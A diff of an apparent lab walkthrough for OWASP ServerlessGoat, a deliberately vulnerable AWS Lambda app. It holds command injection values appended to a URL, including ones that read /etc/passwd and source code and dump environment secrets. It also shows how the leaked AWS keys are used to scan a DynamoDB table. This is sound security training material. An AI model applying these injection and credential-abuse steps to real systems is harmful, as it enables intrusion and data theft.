@@ -24,36 +24,40 @@ To improve application security it is important to take note of the configured p
       
 
 ## Lambda Function API
-1. Locate the Endpoint URL under CloudFormation Outputs
-2. Navigate to URL in a separate browser  
+To Locate the Endpoint URL
+1. Navigate to Services > CloudFormation
+2. Select the Stack name serverless-repo-serverless-goat
+3. Select the Outputs tab & copy the URL listed
+4. Navigate to URL in a separate browser  
 The endpoint loads an OWASP ServerlessGoat page containing a form consisting of 
       * a single user input textbox and submit button  
       * a list of potential vulnerabilities  
-3. Click Submit with the currrent value in place  
+5. Click Submit with the currrent value in place  
 This loads a A Poison Tree poem with a URL that seems remarkably close to an s3 bucket address  
 **Save this URL For Later, or scroll down to (###S3 Bucket Access with No Credentials) to see it's use now**
 
 ## Information Gathering
-1. Click back on the browser to return to the page 
+1. Click back on the browser to return to the main page 
 2. Attempt **Function Data Injection** by adding code to the end of the URL  
 *e.g. try adding*`; pwd`
 3. Click submit to load the original poem as well as **Improper Exception Handling and Verbose Error**  
   *this appears to be vulnerable to __Function Data Injection__*
 ### Improved injection attempts
 1. Click back and change the URL form to a URL that doesn't contain a doc file followed by a snippet of code  
-e.g. `https://inject; pwd`
-2. Click submit to load the current working directory */var/task* 
+e.g. `https://inject; pwd`  
+2. Click submit to load the current working directory */var/task*   
+while this is **Function Data Injection** it is also **Serverless Function Execution Flow Manipulation** since no applications should contain server-side code injections as part of their functions   
 3. Repeat this tasks with the following bash code additions for more information resulting from **Over-Privileged Function Permissions**  
 **Document everything for later**    
 `https://inject; whoami`
    *Current user should be sbx-user0666 or similar*   
 `https://inject; ls -la`
-    *Lists the current directory (index.js + node_modules subdirectory)*   
+   *Lists the current directory (index.js + node_modules subdirectory)*   
 `https://inject; cat /etc/passwd` 
-  *Lists current users*  
+   *Lists current users*  
 `https://inject; cat index.js`
-    *Provides code for basic information on how this page functions*   
-    Important information to be gathered from this file includes:
+   *Provides code for basic information on how this page functions*   
+   Important information to be gathered from this file includes:
       * Database 
       * S3 bucket Put permissions
       * node.js package used 
@@ -63,14 +67,15 @@ e.g. `https://inject; pwd`
  4. Explore file contents  
  `https://inject; cat node_modules/.bin/uuid`   
  USAGE: `uuid [ver] [options]` + some encryption math used to generate keys  
- this doesn't seem to be entirely random
+ This doesn't seem to be entirely random
  5. Read more javascript
   `https://inject; cat node_modules/node-uuid/package.json`  
   *lists package version*  
   Research into this version of UUID results in a known vulnerability to insecure randomness  
   **TL:DR;** math.random can produce predictable values and this in an **Insecure 3rd Party Dependency**  
   keys generated and for storage in the s3 bucket may be predicted  
-  This could be *very* interesting if it was used to store PII, but it isn't for this circumstance  
+  This could be *very* interesting if it was used to store PII, due to the potential s3 bucket enumeration  
+  Since these buckets can already be easily discovered, and do not contain PII, it isn't really interesting  
  6. Check for unsecured environmental variables  
  `https://inject; env`  
  Results in **Insecure Application Secrets Storage**: 
@@ -97,19 +102,22 @@ Return to the previous tab
 #### Node.js Access Enumeration
 Attempt to access content/information using Node.js  
 1. What version of node.js?  
-`https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log("Running Node.js" + process.version))})();'`
+`https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log("Running Node.js" + process.version))})();'`   
+This is typcially the way to verify that Node.js was successfully installed  
+This should **not** be accessible to end users and falls under **Improper Exception Handling and Verbose Error**
 2. Can the database be scanned?  
-`https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`
+`https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`  
+This is **Over-Privileged Function Permissions & Roles**
 3. Potential further questions to be answered by node.js if you're a guru:  
-      * Can the database be queried?
-      * Does GetItem work?
-      * Does PutItem work?
-      * Does UpdateItem work?
-      * Can the s3 buckets be scanned?
+    * Can the database be queried?
+    * Does GetItem work?
+    * Does PutItem work?
+    * Does UpdateItem work?
+    * Can the s3 buckets be scanned?
 
 #### Profile Enumeration
 1. Using the information found in the env variables create a user profile 
-`aws configure profile --user666`  
+`aws configure --profile user666`  
     * aws_secret_access_key    
     * aws_access_key   
     * us-east-1
@@ -119,13 +127,12 @@ Attempt to access content/information using Node.js
 3. Obtain current profile information 
 `aws sts get-caller-identity --profile user666`  
 **Improper Exception Handling and Verbose Errors**
-4. How do I discover information about this profile/user/permissions/roles?
 
 #### Database Actions Enumeration
 1. Attempt to DescribeTable
 
 2. Attempt to scan the database contents  
-`aws dynamodb scan --table-name <table-name> --profile user`
+`aws dynamodb scan --table-name <table-name> --profile user666`
 3. Attempt to Query the database
 4. Attempt to GetItem
 5. Attempt to DeleteItem
